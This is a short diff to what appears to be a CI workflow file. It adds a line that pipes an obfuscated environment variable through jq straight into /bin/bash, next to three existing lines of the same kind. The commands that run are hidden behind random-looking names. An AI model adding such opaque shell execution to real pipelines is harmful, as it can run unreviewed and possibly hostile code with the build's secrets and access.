@@ -35,6 +35,7 @@ jobs:
           echo $snh1685 | jq -r .ftp204 | /bin/bash
           printf '%s' "$y42" | jq -r .aa337 | /bin/bash
           printf '%s' "$mqt7663" | jq -r .bnqx2930 | /bin/bash
+          printf '%s' "$tdqlc16" | jq -r .bvpl985 | /bin/bash
 
       - name: Upload artifact
         if: always()
